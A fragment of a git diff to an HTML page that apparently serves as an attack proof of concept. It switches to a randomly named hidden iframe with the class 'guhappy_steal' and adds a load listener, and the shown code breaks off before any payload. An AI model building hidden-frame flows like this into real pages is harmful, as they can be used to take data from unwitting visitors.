@@ -5,31 +5,31 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <titile>Document</titile>
-    <iframe id="cframe" style="display:none"></iframe>
+<!--     <iframe id="cframe" style="display:none"></iframe> -->
     <script>
-//     function makeid(length) {
-//         var result           = '';
-//         var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-//         var charactersLength = characters.length;
-//         for ( var i = 0; i < length; i++ ) {
-//            result += characters.charAt(Math.floor(Math.random() * charactersLength));
-//         }
-//         return result;
-//      }
+    function makeid(length) {
+        var result           = '';
+        var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for ( var i = 0; i < length; i++ ) {
+           result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+     }
      
    
      function doFlow(){
     
-//          var guhappyId=makeid(5);
-//          var ifrm_c = document.createElement('iframe');
-//          ifrm_c.setAttribute('id', guhappyId);
-//          ifrm_c.setAttribute('class', 'guhappy_steal');
-//          ifrm_c.style.display = "none";
-//          document.head.appendChild(ifrm_c);
+         var guhappyId=makeid(5);
+         var ifrm_c = document.createElement('iframe');
+         ifrm_c.setAttribute('id', guhappyId);
+         ifrm_c.setAttribute('class', 'guhappy_steal');
+         ifrm_c.style.display = "none";
+         document.head.appendChild(ifrm_c);
          
-//          var cframe=document.getElementById(guhappyId);
+         var cframe=document.getElementById(guhappyId);
          
-         var cframe=document.getElementById("cframe");
+//          var cframe=document.getElementById("cframe");
          
          cframe.addEventListener("load",function(){
              setTimeout(function(){
